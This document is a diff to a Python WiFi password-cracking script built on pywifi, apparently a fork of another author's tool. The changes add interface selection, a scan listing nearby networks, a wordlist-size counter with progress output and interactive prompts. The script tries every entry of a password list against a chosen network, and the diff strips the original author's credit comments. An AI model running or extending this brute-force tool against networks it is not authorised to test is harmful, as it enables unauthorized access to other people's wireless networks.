@@ -1,4 +1,4 @@
-#!/usr/bin/env python 3.7
+#!./venv/bin/python
 # -*- coding: utf-8 -*-
 
 import argparse
@@ -17,10 +17,6 @@ except:
     print("Installing pywifi")
 
 
-# By Brahim Jarrar ~
-# GITHUB : https://github.com/BrahimJarrar/ ~
-# CopyRight 2019 ~
-
 RED   = "\033[1;31m"  
 BLUE  = "\033[1;34m"
 CYAN  = "\033[1;36m"
@@ -30,22 +26,29 @@ BOLD    = "\033[;1m"
 REVERSE = "\033[;7m"
 
 try:
+    wlan_num = 1
     # wlan
     wifi = PyWiFi()
-    ifaces = wifi.interfaces()[0]
+    ifaces = wifi.interfaces()[wlan_num]
+    print(RED, f'Interface: {ifaces.name()}')
 
     ifaces.scan() #check the card
+    time.sleep(5)
     results = ifaces.scan_results()
-
-
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
-except:
-    print("[-] Error system")
+    results_ssid = set(map(lambda x: x.ssid, results))
+    print(CYAN, 'Networks:')
+    for ssid in results_ssid:
+        print(' -', ssid)
+    
+    wifi = PyWiFi()
+    iface = wifi.interfaces()[wlan_num]
+except Exception as e:
+    print(f"[-] Error system: {e}")
+    exit()
 
 type = False
 
-def main(ssid, password, number):
+def main(ssid, password, number, n):
 
     profile = Profile() 
     profile.ssid = ssid
@@ -68,16 +71,18 @@ def main(ssid, password, number):
         time.sleep(1)
         exit()
     else:
-        print(RED, '[{}] Crack Failed using {}'.format(number, password))
+        print(RED, '[{}/{}] Crack Failed using {}'.format(number, n, password))
 
 def pwd(ssid, file):
     number = 0
+    n = sum(1 for i in open(file, 'r', encoding='utf8'))
+    print(f'File {file} has {n} passwords')
     with open(file, 'r', encoding='utf8') as words:
         for line in words:
             number += 1
             line = line.split("\n")
             pwd = line[0]
-            main(ssid, pwd, number)
+            main(ssid, pwd, number, n)
                     
 
 
@@ -97,26 +102,30 @@ def menu():
     print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
     time.sleep(2.5)
 
-    if args.wordlist and args.ssid:
-        ssid = args.ssid
-        filee = args.wordlist
+    if args.wordlist or args.ssid:
+        if args.wordlist:
+            filee = args.wordlist
+        else:
+            print(BLUE)
+            filee = input("[*] pwds file: : ")
+        if args.ssid:
+            ssid = args.ssid
+        else:
+            print(BLUE)
+            ssid = input("[*] SSID: ")
     elif args.version:
         print("\n\n",CYAN,"by Brahim Jarrar\n")
         print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
         print(GREEN, " CopyRight 2019\n\n")
         exit()
-    else:
-        print(BLUE)
-        ssid = input("[*] SSID: ")
-        filee = input("[*] pwds file: : ")
 
 
     # thx
     if os.path.exists(filee):
-        if platform.system().startswith("Win" or "win"):
-            os.system("cls")
-        else:
-            os.system("clear")
+        # if platform.system().startswith("Win" or "win"):
+        #     os.system("cls")
+        # else:
+        #     os.system("clear")
 
         print(BLUE,"[~] Cracking...")
         pwd(ssid, filee)
